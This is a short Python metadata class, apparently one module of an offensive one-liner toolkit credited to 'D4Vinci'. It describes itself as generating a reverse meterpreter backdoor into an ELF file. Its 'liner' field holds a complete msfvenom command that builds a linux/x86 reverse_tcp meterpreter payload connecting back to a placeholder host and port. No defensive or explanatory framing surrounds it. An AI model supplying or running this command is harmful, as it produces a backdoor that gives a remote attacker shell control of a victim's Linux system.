class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Generate a reverse meterpreter backdoor into a elf file."
    function    = "Msfvenom Generator"
    liner       = 'msfvenom -p linux/x86/meterpreter/reverse_tcp lhost="TARGET" lport=PORT -f elf > FILE_PATH.elf'
